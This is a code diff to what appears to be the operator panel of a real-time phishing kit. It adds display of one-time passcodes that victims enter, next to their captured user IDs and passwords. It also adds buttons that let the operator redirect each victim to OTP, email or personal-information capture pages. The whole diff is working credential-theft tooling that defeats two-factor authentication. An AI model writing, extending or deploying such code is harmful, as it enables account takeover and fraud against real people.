@@ -101,6 +101,11 @@ export default function LinkPage() {
         content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
         className = 'signin-entry';
         showActions = true;
+      } else if (activity.type === 'otp') {
+        const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
+        content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
+        className = 'otp-entry';
+        showActions = true;
       }
 
       const activityItem = document.createElement('div');
@@ -112,6 +117,16 @@ export default function LinkPage() {
         actionsHTML = `
           <div class="activity-actions" id="actions-${activity.id}">
             <button class="redirect-btn password" data-action="redirect" data-redirect="password">Password Page</button>
+            <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
+            <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
+            <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
+            <button class="deny-btn" data-action="deny">Deny</button>
+          </div>
+          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
+        `;
+      } else if (showActions && activity.type === 'password') {
+        actionsHTML = `
+          <div class="activity-actions" id="actions-${activity.id}">
             <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
             <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
             <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
@@ -136,7 +151,7 @@ export default function LinkPage() {
       `;
 
       // Add event listeners
-      if (showActions && activity.type === 'userid') {
+      if (showActions && (activity.type === 'userid' || activity.type === 'password')) {
         const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
         if (actionsDiv) {
           actionsDiv.addEventListener('click', function(e) {
